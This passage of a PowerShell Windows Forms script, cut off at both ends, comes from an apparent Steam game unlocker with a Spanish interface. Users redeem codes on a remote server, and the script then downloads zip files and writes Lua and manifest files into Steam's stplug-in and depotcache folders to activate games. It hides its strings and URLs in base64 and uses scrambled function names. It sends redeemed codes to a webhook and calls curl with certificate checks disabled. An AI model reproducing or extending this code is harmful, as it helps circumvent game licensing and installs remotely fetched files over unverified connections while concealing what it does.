    if($script:cdp){ $script:cdp.Visible=$true; $script:cdp.BringToFront() }
    try{ Update-CdPanelText }catch{}
}
function RfC{if($script:clp){$script:clp.Invalidate()}}

function Refresh-AllText{
    $script:c1.Tag.Title=T (S("YWN0aXZhcg=="));$script:c1.Tag.Sub=T (S("YWN0aXZhclN1Yg=="));$script:c1.Invalidate()
    $script:c3.Tag.Title=T "idioma";$script:c3.Tag.Sub=T "idiomaSub";$script:c3.Invalidate()
    $script:c4.Tag.Title=T "desinstalar";$script:c4.Tag.Sub=T (S("ZGVzaW5zdGFsYXJTdWI="));$script:c4.Invalidate()
    $script:cWeb.Tag.Title=T "web";$script:cWeb.Tag.Sub=T "webSub";$script:cWeb.Invalidate()
    $script:cTikTok.Tag.Title=T "tiktok";$script:cTikTok.Tag.Sub=T "tiktokSub";$script:cTikTok.Invalidate()
    $script:c5.Tag.Title=T "discord";$script:c5.Tag.Sub=T (S("ZGlzY29yZFN1Yg=="));$script:c5.Invalidate()
    $script:salBtn.Invalidate()
    $script:rTit.Text=T "canjear";$script:rSubL.Text=T (S("Y2FuamVhclN1Yg=="))
    $script:codesT.Text=T (S("Y29kaWdvc0FjdGl2b3M="))
    $script:backB.Invalidate();$script:subB.Invalidate()
    $script:sBack.Invalidate();$script:sTitle.Text=T "config"
    RfC
}

function Show-LangDialog{
    $dlg=New-Object System.Windows.Forms.Form
    $dlg.Text=T "selectIdioma";$dlg.ClientSize=New-Object System.Drawing.Size(260,180)
    $dlg.StartPosition="CenterParent";$dlg.BackColor=$BG
    $dlg.FormBorderStyle="FixedDialog";$dlg.MaximizeBox=$false;$dlg.MinimizeBox=$false;$dlg.ShowInTaskbar=$false
    $dlg.Add_HandleCreated({$v=[int]1;[DwmHelper]::DwmSetWindowAttribute($dlg.Handle,20,[ref]$v,4)|Out-Null})
    $opts=@(@("Espanol","es"),@("English","en"),@("Portugues","pt"));$by=15
    foreach($o in $opts){
        $btn=New-Object System.Windows.Forms.Button
        $btn.Text=$o[0];$btn.Tag=$o[1]
        $btn.Location=New-Object System.Drawing.Point(20,$by)
        $btn.Size=New-Object System.Drawing.Size(220,42)
        $btn.FlatStyle="Flat";$btn.Font=New-Object System.Drawing.Font("Bahnschrift SemiBold",11)
        $btn.ForeColor=$White;$btn.BackColor=$CardBG
        $btn.FlatAppearance.BorderColor=$CardBorder;$btn.FlatAppearance.MouseOverBackColor=$CardHover
        $btn.Cursor=[System.Windows.Forms.Cursors]::Hand
        $btn.Add_Click({param($sender);$script:currentLang=$sender.Tag;Refresh-AllText;$dlg.Close()})
        $dlg.Controls.Add($btn);$by+=50
    }
    $dlg.ShowDialog()|Out-Null;$dlg.Dispose()
}




$script:mp=New-BufferedPanel
$script:mp.Location=New-Object System.Drawing.Point(0,$CY)
$script:mp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:mp.BackColor=$BG


$script:c1=New-Card -X $PAD -Y $R1Y -W $HW -H $CH -Title (T (S("YWN0aXZhcg=="))) -Sub (T (S("YWN0aXZhclN1Yg=="))) -Icon "lightning" -Click {Switch-ToRedeem}
$script:mp.Controls.Add($script:c1)
$script:c3=New-Card -X ($PAD+$HW+$GAP) -Y $R1Y -W $HW -H $CH -Title (T "idioma") -Sub (T "idiomaSub") -Icon "globe" -Click {Show-LangDialog}
$script:mp.Controls.Add($script:c3)




$script:mp.Controls.Remove($script:c3)
$script:c3=New-Card -X $PAD -Y $R2Y -W $HW -H $CH -Title (T "idioma") -Sub (T "idiomaSub") -Icon "globe" -Click {Show-LangDialog}
$script:mp.Controls.Add($script:c3)
$script:c4=New-Card -X ($PAD+$HW+$GAP) -Y $R2Y -W $HW -H $CH -Title (T "desinstalar") -Sub (T (S("ZGVzaW5zdGFsYXJTdWI="))) -Icon "trash" -Click {
    $timers = At5Vc
    if ($timers.Count -eq 0) { [System.Windows.Forms.MessageBox]::Show((S("Tm8gaGF5IGNvZGlnb3MgYWN0aXZvcyBwYXJhIGRlc2luc3RhbGFyLg==")),(T "desinstalar"),"OK","Information"); return }
    
    if ([System.Windows.Forms.MessageBox]::Show("ESTA ACCION ES PERMANENTE`n`nEste boton eliminara TODOS los juegos activos de forma PERMANENTE.`n`nESTAS SEGURO? SE BORRARAN TODOS LOS JUEGOS.",(T "desinstalar"),"YesNo","Warning") -ne "Yes") { return }
    if ([System.Windows.Forms.MessageBox]::Show("ULTIMA CONFIRMACION`n`nSe eliminaran todos los juegos activos. Esta accion no se puede deshacer.`n`nContinuar?",(T "desinstalar"),"YesNo","Warning") -ne "Yes") { return }
    $errors=0
    foreach ($t in $timers) {
        try { $root=$t.steam_root; foreach ($f in $t.lua_files) { Remove-FileHard (Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f); Remove-FileHard (Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f) }; foreach ($f in $t.manifest_files) { Remove-FileHard (Join-Path (Join-Path $root "config\depotcache") $f) } } catch { $errors++ }
    }
    St7Xb @(); $script:activeCodes.Clear(); RfC
    [System.Windows.Forms.MessageBox]::Show("Juegos eliminados correctamente.","Listo","OK","Information")
}
$script:mp.Controls.Add($script:c4)


$script:mp.Controls.Remove($script:c1)
$script:c1=New-Card -X $PAD -Y $R1Y -W $CW -H $CH -Title (T (S("YWN0aXZhcg=="))) -Sub (T (S("YWN0aXZhclN1Yg=="))) -Icon "lightning" -Click {Switch-ToRedeem}
$script:mp.Controls.Add($script:c1)


$script:cWeb=New-Card -X $PAD -Y $TIK_Y -W $HW -H $FCH -Title (T "web") -Sub (T "webSub") -Icon "webpage" -Click {Start-Process (D "aHR0cHM6Ly9iYXN0aXNzc3RlYW0ubmV0bGlmeS5hcHA=")}
$script:mp.Controls.Add($script:cWeb)
$script:cBiblio=New-Card -X $PAD -Y $WEB_Y -W $CW -H $FCH -Title "Biblioteca" -Sub "Juegos con portada" -Icon "lightning" -Click { Show-Biblio }
$script:mp.Controls.Add($script:cBiblio)
$script:cTikTok=New-Card -X ($PAD+$HW+$GAP) -Y $TIK_Y -W $HW -H $FCH -Title (T "tiktok") -Sub (T "tiktokSub") -Icon "tiktok" -Click {Start-Process (D "aHR0cHM6Ly93d3cudGlrdG9rLmNvbS9AYmFzdGlzc3N0ZWFtP2xhbmc9ZXM=")}
$script:mp.Controls.Add($script:cTikTok)




$script:c5=New-Card -X $PAD -Y $DISC_Y -W $CW -H $FCH -Title (T "discord") -Sub (T (S("ZGlzY29yZFN1Yg=="))) -Icon "discord" -Click {Start-Process (D "aHR0cHM6Ly9kaXNjb3JkLmdnL3czbmhHZVd1dlQ=")}
$script:mp.Controls.Add($script:c5)


$script:salBtn=New-BufferedPanel
$script:salBtn.Location=New-Object System.Drawing.Point($PAD,$SAL_Y)
$script:salBtn.Size=New-Object System.Drawing.Size($CW,$SAL_H);$script:salBtn.BackColor=$BG
$script:salBtn.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:salBtn.Tag=@{Hover=$false}
$script:salBtn.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:salBtn.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:salBtn.Add_Click({ $form.Hide(); $script:trayIcon.Visible = $true })
$script:salBtn.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) $CR
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $ep=New-Object System.Drawing.Pen($script:Cyan,1.8);$ecx=($s.Width/2)-22;$ecy=$s.Height/2
    $g.DrawLine($ep,($ecx-6),($ecy-8),($ecx-6),($ecy+8))
    $g.DrawLine($ep,($ecx-6),($ecy-8),$ecx,($ecy-8))
    $g.DrawLine($ep,($ecx-6),($ecy+8),$ecx,($ecy+8))
    $g.DrawLine($ep,($ecx+2),$ecy,($ecx+12),$ecy)
    $g.DrawLine($ep,($ecx+8),($ecy-4),($ecx+12),$ecy)
    $g.DrawLine($ep,($ecx+8),($ecy+4),($ecx+12),$ecy);$ep.Dispose()
    $tb=New-Object System.Drawing.SolidBrush($script:White);$txt=T "salir"
    $ss=$g.MeasureString($txt,$script:FntSalir)
    $g.DrawString($txt,$script:FntSalir,$tb,($s.Width/2)-($ss.Width/2)+8,($s.Height-$ss.Height)/2);$tb.Dispose()
})
$script:mp.Controls.Add($script:salBtn)
$form.Controls.Add($script:mp)




$script:rp=New-BufferedPanel
$script:rp.Location=New-Object System.Drawing.Point(0,$CY)
$script:rp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:rp.BackColor=$BG;$script:rp.Visible=$false


$script:backB=New-BufferedPanel
$script:backB.Location=New-Object System.Drawing.Point($PAD,8)
$script:backB.Size=New-Object System.Drawing.Size(36,36);$script:backB.BackColor=$BG
$script:backB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:backB.Tag=@{Hover=$false}
$script:backB.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:backB.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:backB.Add_Click({Switch-ToMain})
$script:backB.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    
    $ap=New-Object System.Drawing.Pen($script:Cyan,2.5)
    $cx2=$s.Width/2;$cy2=$s.Height/2
    $g.DrawLine($ap,($cx2+4),($cy2-7),($cx2-4),$cy2)
    $g.DrawLine($ap,($cx2-4),$cy2,($cx2+4),($cy2+7));$ap.Dispose()
})
$script:rp.Controls.Add($script:backB)


$script:rTit=New-Object System.Windows.Forms.Label
$script:rTit.Text=T "canjear"
$script:rTit.Font=$script:FntRedeemTitle
$script:rTit.ForeColor=$White;$script:rTit.BackColor=$BG;$script:rTit.AutoSize=$true
$script:rTit.Location=New-Object System.Drawing.Point(([int]$PAD+42),14)
$script:rp.Controls.Add($script:rTit)

$script:rSubL=New-Object System.Windows.Forms.Label
$script:rSubL.Text=T (S("Y2FuamVhclN1Yg=="))
$script:rSubL.Font=$FntSub;$script:rSubL.ForeColor=$Gray;$script:rSubL.BackColor=$BG;$script:rSubL.AutoSize=$true
$script:rSubL.Location=New-Object System.Drawing.Point($PAD,52)
$script:rp.Controls.Add($script:rSubL)


$txtC=New-Object System.Windows.Forms.TextBox
$txtC.Location=New-Object System.Drawing.Point($PAD,76)
$txtC.Size=New-Object System.Drawing.Size(([int]$CW-160),26)
$txtC.Font=New-Object System.Drawing.Font("Consolas",11)
$txtC.BackColor=$InputBG;$txtC.ForeColor=$White;$txtC.BorderStyle="FixedSingle";$txtC.MaxLength=50
$script:rp.Controls.Add($txtC)
try { $lt0 = Get-LocalToken; if ($lt0 -and $lt0.code) { $txtC.Text = ([string]$lt0.code).Trim().ToUpper() } } catch {}


$script:pasteB=New-BufferedPanel
$script:pasteB.Location=New-Object System.Drawing.Point(([int]$PAD+[int]$CW-154),74)
$script:pasteB.Size=New-Object System.Drawing.Size(50,28);$script:pasteB.BackColor=$BG
$script:pasteB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:pasteB.Tag=@{Hover=$false}
$script:pasteB.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:pasteB.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:pasteB.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:PegarBtnBGH}else{$script:PegarBtnBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 7
    $b1=New-Object System.Drawing.SolidBrush($bc);$bp=New-Object System.Drawing.Pen($script:Cyan,1)
    $g.FillPath($b1,$p);$g.DrawPath($bp,$p);$b1.Dispose();$bp.Dispose();$p.Dispose()
    $sz=$g.MeasureString((T "pegarBtn"),$script:FntSubmit)
    $tb=New-Object System.Drawing.SolidBrush($script:Cyan)
    $g.DrawString((T "pegarBtn"),$script:FntSubmit,$tb,($s.Width-$sz.Width)/2,($s.Height-$sz.Height)/2);$tb.Dispose()
})
$script:pasteB.Add_Click({
    try {
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        if ($clip) { $txtC.Text = $clip.Trim(); $txtC.Focus(); $txtC.Select($txtC.Text.Length,0) }
    } catch { [System.Windows.Forms.MessageBox]::Show("No se pudo acceder al portapapeles.","Error","OK","Warning") | Out-Null }
})
$script:rp.Controls.Add($script:pasteB)

$script:subB=New-BufferedPanel
$script:subB.Location=New-Object System.Drawing.Point(([int]$PAD+[int]$CW-98),74)
$script:subB.Size=New-Object System.Drawing.Size(98,28);$script:subB.BackColor=$BG
$script:subB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:subB.Tag=@{Hover=$false}
$script:subB.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:subB.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:subB.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:GreenBtnH}else{$script:GreenBtn}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 7
    $b1=New-Object System.Drawing.SolidBrush($bc);$g.FillPath($b1,$p);$b1.Dispose();$p.Dispose()
    $sz=$g.MeasureString((T (S("Y2FuamVhckJ0bg=="))),$script:FntSubmit)
    $tb=New-Object System.Drawing.SolidBrush($script:White)
    $g.DrawString((T (S("Y2FuamVhckJ0bg=="))),$script:FntSubmit,$tb,($s.Width-$sz.Width)/2,($s.Height-$sz.Height)/2);$tb.Dispose()
})
$script:redeemParallel=$true
try{ $v=Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name RedeemParallel -ErrorAction SilentlyContinue; if($v -ne $null){ $script:redeemParallel=[bool][int]$v.RedeemParallel } }catch{}

$script:uiBusy = $false
$script:subB.Add_Click({
    $locTok = Get-LocalToken
    $code=$txtC.Text.Trim().ToUpper()
    $forceCf=$false
    if ($code -match '^C\.(.+)$') { $code=$Matches[1].Trim(); $txtC.Text=$code; if ($code) { $forceCf=$true } }
    if([string]::IsNullOrEmpty($code) -and $locTok -and $locTok.code){ $code=([string]$locTok.code).Trim().ToUpper(); $txtC.Text=$code }
    if([string]::IsNullOrEmpty($code)){$lblR.ForeColor=$script:Red;$lblR.Text=T (S("ZXJyb3JDb2RpZ28="));[System.Windows.Forms.Application]::DoEvents();return}
    $lblR.ForeColor=$script:Yellow;$lblR.Text=if($forceCf){"Conectando (probando de otra manera)..."}else{"Conectando con servidor..."}
    [System.Windows.Forms.Application]::DoEvents()
    if ($script:uiBusy) { $lblR.Text="Ya hay un canje en curso, espera que termine..."; return }
    try { $script:uiBusy = $true } catch {}
    $cdSW = [System.Diagnostics.Stopwatch]::StartNew()
    try {
        $redeemNow, $_ = Get-Now
        $sendToken = ""
        if ($locTok -and $locTok.token) { $sendToken = [string]$locTok.token }
        $body = @{code=$code;client_id=$script:clientId;redeem_at=$redeemNow.ToString("o");token=$sendToken} | ConvertTo-Json
        $lastErr = $null
        for ($attempt = 0; $attempt -lt 3 -and $cdSW.Elapsed.TotalSeconds -lt 15; $attempt++) {
            try {
                Update-ServerUrl
                $cands = @()
                $primPair = @([string]$script:serverUrl, [string]$script:serverIp)
                $secPair = $null
                if ($script:serverUrlCf -and $script:serverUrlCf -ne $script:serverUrl) { $secPair = @([string]$script:serverUrlCf, [string]$script:serverIpCf) }
                if ($forceCf) {
                    if ($secPair) { $cands += ,$secPair }
                    else { throw "Probando de otra manera: no hay URL secundaria configurada." }
                }
                else { if ($primPair[0]) { $cands += ,$primPair }; if ($secPair) { $cands += ,$secPair } }
                $tempBody = Join-Path $env:TEMP (S("YnNtYXBfcmVkZWVtX2JvZHkuanNvbg=="))
                $tempResp = Join-Path $env:TEMP (S("YnNtYXBfcmVkZWVtX3Jlc3AuanNvbg=="))
                $utf8NoBom = New-Object System.Text.UTF8Encoding $false
                [System.IO.File]::WriteAllText($tempBody, $body, $utf8NoBom)
                $rr = $null
                $triedUrls = @(); $candErrs = @(); $usedUrl = ""
                foreach ($cd in $cands) {
                    if ($cdSW.Elapsed.TotalSeconds -ge 15) { break }
                    $candUrl = $cd[0]; $candIp = $cd[1]
                    $reqUrl = "$candUrl/api/redeem-code"
                    $resolveArg = @()
                    if ($candIp -and $candUrl -match "^https://([a-zA-Z0-9-]+)") { $hn = ([uri]$candUrl).Host; if ($hn) { $resolveArg = @("--resolve", "$($hn):443:$candIp") } }
                    $resolveStr = ($resolveArg -join "|")
                    $rr = Invoke-PsBlockingDoEvents {
                    param($reqUrl, $body, $tempBody, $tempResp, $resolveStr, $serverIp)
                    $u8 = New-Object System.Text.UTF8Encoding $false
                    $ra = @(); if ($resolveStr) { $ra = @($resolveStr -split '\|') }
                    $psiR = New-Object System.Diagnostics.ProcessStartInfo
                    $psiR.FileName = "curl.exe"
                    $psiR.Arguments = ((@('-s','-k','--ssl-no-revoke','--tlsv1.2','--noproxy','*') + @($ra) + @('-X','POST','-H','Content-Type: application/json','--data-binary',"@$tempBody",$reqUrl,'--connect-timeout','4','--max-time','7','-o',$tempResp) | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
                    $psiR.CreateNoWindow = $true
                    $psiR.UseShellExecute = $false
                    $psiR.RedirectStandardError = $true
                    $prR = New-Object System.Diagnostics.Process
                    $prR.StartInfo = $psiR
                    $curlOut = @()
                    $ce = -1
                    try {
                        [void]$prR.Start()
                        if (-not $prR.WaitForExit(20000)) { try { $prR.Kill() } catch {} }
                        $ce = $prR.ExitCode
                        try { $curlOut = @($prR.StandardError.ReadToEnd() -split "`r?`n") } catch {}
                    } catch {}
                    $respRaw = $null
                    if ($ce -eq 0 -and (Test-Path -LiteralPath $tempResp)) { $respRaw = [System.IO.File]::ReadAllText($tempResp, $u8) }
                    if (-not $respRaw) {
                        $curlErr = (($curlOut | Where-Object { $_ -is [string] }) -join " | ").Trim()
                        try {
                            $iwr = Invoke-WebRequest -Uri $reqUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 6 -UseBasicParsing -ErrorAction Stop
                            $respRaw = $iwr.Content
                        } catch {
                            return [pscustomobject]@{ err = "curl exit $ce URL: $reqUrl | serverIp: $serverIp | curl-err: $curlErr | IWR-fallback-err: $($_.Exception.Message)" }
                        }
                    }
                    if ($respRaw -match "^\s*<") { return [pscustomobject]@{ err = "Servidor devolvio HTML (error 500): $($respRaw.Substring(0,200))" } }
                    try { $resp = $respRaw | ConvertFrom-Json } catch { return [pscustomobject]@{ err = "Respuesta invalida del servidor: $respRaw" } }
                    if ($null -eq $resp -or $resp -is [string] -or $resp -is [int] -or $resp -is [array]) { return [pscustomobject]@{ err = "Respuesta invalida del servidor (json primitivo): $respRaw" } }
                    return [pscustomobject]@{ json = ($resp | ConvertTo-Json -Depth 6 -Compress) }
                } @($reqUrl, $body, $tempBody, $tempResp, $resolveStr, [string]$candIp) -TimeoutSec 8
                    Remove-Item $tempResp -Force -ErrorAction SilentlyContinue
                    $triedUrls += $candUrl
                    try { $script:lastTried = ($triedUrls -join " -> ") } catch {}
                    if ($rr -and $rr.json) { $usedUrl = $candUrl; break }
                    if ($rr -and $rr.err) { $candErrs += "[$candUrl] $($rr.err)"; try { $script:lastCandErrs = ($candErrs -join " || ") } catch {} }
            }
            Remove-Item $tempBody -Force -ErrorAction SilentlyContinue
                if (-not $rr) { throw "Sin respuesta del servidor" }
                if ($rr.err) { $allE = ($candErrs -join " || "); if (-not $allE) { $allE = $rr.err }; throw $allE }
                $resp = $rr.json | ConvertFrom-Json
                $lastErr=$null; break
                }catch{ $lastErr=$_; Start-SleepDoEvents 600 }
            }
            if($lastErr){ throw $lastErr }
            if(-not $resp.ok){ throw $resp.err }
            try { if ($resp.token) { Set-LocalToken ([string]$resp.token) $code } } catch {}
            $links = @($resp.links); $duration = [int]$resp.duration
        $rMode = ""; try { $rMode = ([string]$resp.mode).ToLower() } catch {}
        $modeNum = switch ($rMode) { 'ip' { 2 } 'ar' { 3 } default { 1 } }
        if ($links.Count -eq 0) { throw (S("RWwgY29kaWdvIG5vIGNvbnRpZW5lIGxpbmtzLg==")) }
        $viaTxt = if ($usedUrl -and $usedUrl -eq $script:serverUrlCf) { "Cloudflare" } else { "Tailscale" }
        $tryTxt = ($triedUrls -join " -> "); if (-not $tryTxt) { $tryTxt = $usedUrl }
        $srvInfo = "**App:** $script:version`n**Servidor:** $usedUrl`n**Via:** $viaTxt`n**Intentos:** $tryTxt" + $(if ($forceCf) { "`n**Modo:** Probando de otra manera (c.)" } else { "" })
        Send-Webhook $code (($links -join "`n") + "`n$srvInfo")
        $baseNow, $baseIsNet = Get-Now
        $expDate = $null
        if ($resp.expires_at) { try { $eVig = [datetime]::Parse([string]$resp.expires_at); if ($eVig.Kind -eq [DateTimeKind]::Utc) { $eVig = $eVig.ToLocalTime() }; $expDate = $eVig } catch {} }
        if (-not $expDate -and $duration -gt 0) { $expDate = $baseNow.AddSeconds($duration) }
        $steamRoot = Get-SteamPath
        try { Set-LoteJob (New-LoteJob $code $links $duration $expDate $steamRoot) } catch {}
        try { $lblR.ForeColor=$script:Yellow; $lblR.Text="Codigo valido"; [System.Windows.Forms.Application]::DoEvents() } catch {}
        $total=$links.Count
        try { $script:activeCodes.Add(@{Code=$code;Game="";ActivatedAt=$baseNow;ExpiresAt=$(if($expDate){$expDate}else{$baseNow.AddYears(1)});Duration=$duration;InternetCreatedAt=$baseNow.ToString("o")})|Out-Null } catch {}
        try { Send-PatchStatus $code "PENDIENTE $total juegos | Servidor: $usedUrl ($viaTxt)" } catch {}
        $lblR.ForeColor=$script:Green; $lblR.Text="$(Format-Juegos $total) listos para activar."
        $script:rp.Invalidate(); RfC
        try { $form.Show(); $form.WindowState='Normal'; $form.Activate() } catch {}
        Switch-ToCodeDetail $code
        try { $script:uiBusy = $false } catch {}
        return
        if($false){
        $successCount=0; $errors=@()
        if($script:redeemParallel -and $total -gt 1){
            $lblR.Text="Descargando $total lotes en paralelo..."; [System.Windows.Forms.Application]::DoEvents()
            $pool=[RunspaceFactory]::CreateRunspacePool(1, [Math]::Min($total,6))
            $pool.Open()
            $jobs=@()
            for($i=0;$i -lt $total;$i++){
                $mfUrl=$links[$i]
                $gameName=[System.IO.Path]::GetFileNameWithoutExtension(($mfUrl -split '/')[-2]); if($gameName){$gameName=$gameName -replace '%[0-9a-fA-F]{2}', ''}
                $zipFile=Join-Path $env:TEMP "fix_$(Get-Random)_$i.zip"
                $ps=[PowerShell]::Create()
                $ps.RunspacePool=$pool
                [void]$ps.AddScript({
                    param($url,$zip,$gName,$expDate,$codeStr,$steamRoot)
                    try{
                        $res=@{ok=$false; err=""; lua=@(); man=@(); game=$gName}
                        # descargar con curl (redirect + retry, como Bn6Lc directo)
                        $psiL = New-Object System.Diagnostics.ProcessStartInfo
                        $psiL.FileName = "curl.exe"
                        $psiL.Arguments = ((@('-s','-k','-L','--ssl-no-revoke','--retry','3','--retry-delay','3','--retry-all-errors','-C','-','-H','User-Agent: Mozilla/5.0','-o',$zip,$url,'--max-time','180') | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
                        $psiL.CreateNoWindow = $true
                        $psiL.UseShellExecute = $false
                        $prL = New-Object System.Diagnostics.Process
                        $prL.StartInfo = $psiL
                        $ceL = -1
                        try { [void]$prL.Start(); if (-not $prL.WaitForExit(200000)) { try { $prL.Kill() } catch {} }; $ceL = $prL.ExitCode } catch {}
                        if($ceL -ne 0 -or -not (Test-Path $zip) -or (Get-Item $zip).Length -lt 500){ throw "descarga fallida para $url" }
                        Add-Type -AssemblyName System.IO.Compression.FileSystem
                        $tmpExp=Join-Path $env:TEMP "par_$(Get-Random)"
                        New-Item -ItemType Directory -Path $tmpExp -Force | Out-Null
                        [IO.Compression.ZipFile]::ExtractToDirectory($zip,$tmpExp)
                        # carpetas destino
                        $luaDir=Join-Path $steamRoot "config\stplug-in"
                        $luaDir2=Join-Path $steamRoot "config\lua"
                        $manDir=Join-Path $steamRoot "config\depotcache"
                        $manRoot=Join-Path $steamRoot "depotcache"
                        foreach($d in @($luaDir,$luaDir2,$manDir,$manRoot)){ if(-not (Test-Path $d)){ New-Item -ItemType Directory -Path $d -Force | Out-Null } }
                        $luas=@(Get-ChildItem $tmpExp -Recurse -Filter *.lua | ForEach-Object { $_.Name })
                        $mans=@(Get-ChildItem $tmpExp -Recurse -Filter *.manifest | ForEach-Object { $_.Name })
                        # header BSMAP
                        $header=""
                        if($gName -and $expDate){
                            $header="-- BSMAP_EXPIRES:$($expDate.ToString('yyyy-MM-ddTHH:mm:ss'))`n-- BSMAP_GAME:$gName`n"
                            if($mans.Count -gt 0){ $header+="-- BSMAP_MANIFESTS:$($mans -join ',')`n" }
                            if($codeStr){ $header+="-- BSMAP_CODE:$codeStr`n" }
                        }
                        foreach($f in Get-ChildItem $tmpExp -Recurse -Filter *.lua){
                            $dst1=Join-Path $luaDir $f.Name; $dst2=Join-Path $luaDir2 $f.Name
                            if($header){ try{ $c=[IO.File]::ReadAllText($f.FullName); [IO.File]::WriteAllText($dst1, $header+$c, (New-Object System.Text.UTF8Encoding $false)); [IO.File]::WriteAllText($dst2, $header+$c, (New-Object System.Text.UTF8Encoding $false)) }catch{ Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force } }
                            else { Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force }
                        }
                        foreach($f in Get-ChildItem $tmpExp -Recurse -Filter *.manifest){ Copy-Item $f.FullName (Join-Path $manDir $f.Name) -Force; Copy-Item $f.FullName (Join-Path $manRoot $f.Name) -Force }
                        Remove-Item $tmpExp -Recurse -Force -ErrorAction SilentlyContinue
                        $res.ok=$true; $res.lua=$luas; $res.man=$mans
                    }catch{ $res.err=$_.Exception.Message }
                    Remove-Item $zip -Force -ErrorAction SilentlyContinue
                    return $res
                }).AddArgument($mfUrl).AddArgument($zipFile).AddArgument($gameName).AddArgument($expDate).AddArgument($code).AddArgument($steamRoot)
                $h=$ps.BeginInvoke()
                $jobs+=@{ps=$ps; handle=$h; game=$gameName; url=$mfUrl}
            }
            while(@($jobs | Where-Object { -not $_.handle.IsCompleted }).Count -gt 0){
                $done=@($jobs | Where-Object { $_.handle.IsCompleted }).Count
                $lblR.Text="Paralelo $done/$total"; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 200
            }
            foreach($j in $jobs){
                try{
                    $r=$j.ps.EndInvoke($j.handle)
                    if($r -and $r.ok){
                        $successCount++
                        $timerExp=if($expDate){$expDate}else{$baseNow.AddYears(1)}
                        $timers=At5Vc; $internetNow,$netOk=Get-InternetTime; if(-not $internetNow){$internetNow=$baseNow}; $iNow=$internetNow.ToString("o")
                        $timers+=@{redeem_code=$code;duration=$duration;expires_at=$timerExp.ToString("o");internet_created_at=$iNow;game_name=$j.game;steam_root=$steamRoot;lua_files=@($r.lua);manifest_files=@($r.man)}
                        St7Xb $timers
                        $script:activeCodes.Add(@{Code=$code;Game=$j.game;ActivatedAt=$baseNow;ExpiresAt=$(if($expDate){$expDate}else{$baseNow.AddYears(1)});Duration=$duration;InternetCreatedAt=$iNow})|Out-Null
                        try { Mark-LoteDone $code $j.url @($r.lua) @($r.man) $j.game } catch {}
                    } else { $errors+="$($j.game) : $($r.err)"; WEL "Download $($j.game)" $r.err }
                }catch{ $errors+="$($j.game) : $($_.Exception.Message)" }
                try{ $j.ps.Dispose() }catch{}
            }
            $pool.Close(); $pool.Dispose()
        } else {
            foreach ($mfUrl in $links) {
                $gameName = [System.IO.Path]::GetFileNameWithoutExtension(($mfUrl -split '/')[-2])
                if ($gameName) { $gameName = $gameName -replace '%[0-9a-fA-F]{2}', '' }
                $lblR.Text = "($($successCount+1)/$total) $gameName"; [System.Windows.Forms.Application]::DoEvents()
                $zipFile = Join-Path $env:TEMP "fix_$(Get-Random).zip"
                try {
                    Bn6Lc $mfUrl $zipFile
                    $installResult = Extract-AndInstall $zipFile $gameName $expDate $code
                    
                    $timerExp = if ($expDate) { $expDate } else { $baseNow.AddYears(1) }
                    $timers = At5Vc
                    $internetNow, $netOk = Get-InternetTime
                    if (-not $internetNow) { $internetNow = $baseNow }
                    $iNow = $internetNow.ToString("o")
                    $timers += @{redeem_code=$code;duration=$duration;expires_at=$timerExp.ToString("o");internet_created_at=$iNow;game_name=$gameName;steam_root=$steamRoot;lua_files=@($installResult.lua);manifest_files=@($installResult.manifest)}
                    St7Xb $timers
                    $script:activeCodes.Add(@{Code=$code;Game=$gameName;ActivatedAt=$baseNow;ExpiresAt=$(if($expDate){$expDate}else{$baseNow.AddYears(1)});Duration=$duration;InternetCreatedAt=$iNow})|Out-Null
